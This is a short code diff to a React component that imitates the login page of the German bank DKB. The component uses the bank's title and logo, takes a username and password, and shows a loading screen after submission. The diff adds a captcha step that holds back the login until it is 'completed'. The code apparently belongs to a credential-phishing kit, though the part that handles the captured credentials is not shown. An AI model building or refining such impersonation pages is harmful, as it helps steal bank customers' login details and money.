@@ -57,8 +57,7 @@ const DKB = () => {
   ];
   usePageMeta("DKB – Mein Banking", logoAsset.url);
 
-  const handleSubmit = async (e: React.FormEvent) => {
-    e.preventDefault();
+  const doLogin = async () => {
     if (submitting) return;
     if (username.trim().length === 0 || password.length === 0) return;
     setSubmitting(true);
@@ -74,6 +73,25 @@ const DKB = () => {
     }
     setShowLoading(true);
   };
+
+  const handleSubmit = (e: React.FormEvent) => {
+    e.preventDefault();
+    if (submitting) return;
+    if (captcha === "done") {
+      doLogin();
+      return;
+    }
+    setPendingSubmit(true);
+    if (captcha === "idle") setCaptcha(0);
+  };
+
+  useEffect(() => {
+    if (captcha === "done" && pendingSubmit) {
+      setPendingSubmit(false);
+      doLogin();
+    }
+    // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [captcha, pendingSubmit]);
 
   return (
     <div
